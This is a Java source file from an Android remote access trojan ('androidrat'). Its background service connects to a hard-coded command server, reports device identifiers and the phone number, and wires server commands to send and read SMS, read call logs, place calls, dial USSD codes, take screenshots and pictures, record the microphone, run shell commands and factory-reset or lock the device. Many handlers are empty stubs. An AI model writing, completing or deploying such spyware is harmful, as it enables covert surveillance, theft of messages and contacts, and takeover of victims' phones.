package com.ot.androidrat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

import java.net.URI;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class MainService extends Service {

    Socket ioSocket = IO.socket(URI.create("http://192.168.54.11:5001"));


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        final Handler handler = new Handler();
        final int delay = 1000; // 1000 milliseconds == 1 second

        handler.postDelayed(new Runnable() {
            @SuppressLint("HardwareIds")
            public void run() {
                try {
                    @SuppressLint("HardwareIds") String device_id = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
                    String manufacturer = Build.MANUFACTURER.substring(0, 1).toUpperCase() + Build.MANUFACTURER.substring(1);
                    String model = Build.MODEL;
                    int apiLevel = Build.VERSION.SDK_INT;
                    TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                    String imei = "imei placeholder";
                    String imsi = "imsi";
                    String phoneNumber = null;
                    if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                        phoneNumber = telephonyManager.getLine1Number();
                    }
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("model", manufacturer + " " + model);
                    jsonObject.put("device_id", device_id);
                    jsonObject.put("api", apiLevel);
                    jsonObject.put("imei", imei);
                    if(phoneNumber != null){
                        jsonObject.put("phone", phoneNumber);
                    }else{
                        jsonObject.put("phone", "");
                    }

                    ioSocket.on("android value", args -> Log.i("socket", args[0].toString()));
                    ioSocket.on("0x0", sendSMS);
                    ioSocket.on("0x1", readSMS);
                    ioSocket.on("0x2", readCallLogs);
                    ioSocket.on("0x3", makePhoneCall);
                    ioSocket.on("0x4", dialUssd);
                    ioSocket.on("0x5", readContact);
                    ioSocket.on("0x6", writeContact);
                    ioSocket.on("0x7", screenshot);
                    ioSocket.on("0x8", getCameraList);
                    ioSocket.on("0x9", takePicture);
                    ioSocket.on("0xA", recordMicrophone);
                    ioSocket.on("0xB", shCommand);
                    ioSocket.on("0xC", listInstalledApps);
                    ioSocket.on("0xD", vibratePhone);
                    ioSocket.on("0xE", changeWallpaper);
                    ioSocket.on("0xE", factoryResetDevice);
                    ioSocket.on("0xE", rebootDevice);
                    ioSocket.on("0xE", changeDevicePassword);

                    if(!ioSocket.connected()){
                        ioSocket.connect();
                        ioSocket.emit("android_connect", jsonObject);
                    }
                }catch  (Exception ex){
                    Log.i("Socket", ex.getMessage());
                }
                Log.i("Service", "The service is working");
                handler.postDelayed(this, delay);
            }
        }, delay);
        return START_STICKY;
    }

    private Emitter.Listener sendSMS = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            try{
                int result = SMS.sendSMS(args[0].toString(), args[1].toString());
                JSONObject jsonObject = new JSONObject();
                if (result == 0){
                    jsonObject.put("status", "SMS to " + args[1].toString() + " sent successfully");
                } else{
                    jsonObject.put("status", "SMS to " + args[1].toString() + " failed");
                }
                // emit result
            } catch (Exception exception) {
                Log.i("sendSMS", exception.getMessage());
            }
        }
    };

    private Emitter.Listener readSMS = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject = SMS.readSMS(getApplicationContext());
                if (jsonObject != null) {
                    // emit json
                }else {
                    // emit failed
                }
            } catch (Exception exception) {
                Log.i("readSMS", exception.getMessage());
            }
        }
    };

    private Emitter.Listener readCallLogs = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject = Voice.readCallLog(getApplicationContext());
                if (jsonObject != null) {
                    // emit json
                }else {
                    // emit failed
                }
            } catch (Exception exception) {
                Log.i("readSMS", exception.getMessage());
            }
        }
    };

    private Emitter.Listener makePhoneCall = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            try {
                int result = Voice.phoneCall(getApplicationContext(), args[0].toString());
                if (result == 0) {
                    // emit success
                }else {
                    // emit failure
                }
            } catch (Exception exception) {
                Log.i("readSMS", exception.getMessage());
            }
        }
    };

    private Emitter.Listener dialUssd = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            String result = Voice.dialUSSD(args[0].toString(), getApplicationContext());
            if(result == "No USSD code supplied") {
                // emit fialed
            } else if(result == "API level not supported"){
                // emit somethibg
            }
            else{
                // emit result
            }
        }
    };

    private Emitter.Listener takePicture = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener getCameraList = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            JSONObject cameraList = Camera.findCameraList();
            // check if camera list isn't null then emit
        }
    };

    private Emitter.Listener screenshot = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            ScreenCapture.screencap();
        }
    };

    private Emitter.Listener changeWallpaper = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener recordMicrophone = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener listInstalledApps = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener vibratePhone = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            Vibrate.vibratePhone(getApplicationContext(), Integer.parseInt(args[0].toString()));
        }
    };

    private Emitter.Listener writeContact = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener readContact = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener resetPassword = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            new DeviceManager(getApplicationContext(), new ComponentName(getApplicationContext(), MainActivity.class)).resetPassword("replace with new password");
        }
    };

    private Emitter.Listener sendSerialCommand = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener shCommand = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener getLocation = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener changeDevicePassword = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener factoryResetDevice = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };

    private Emitter.Listener rebootDevice = new Emitter.Listener() {
        @Override
        public void call(Object... args) {

        }
    };


    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}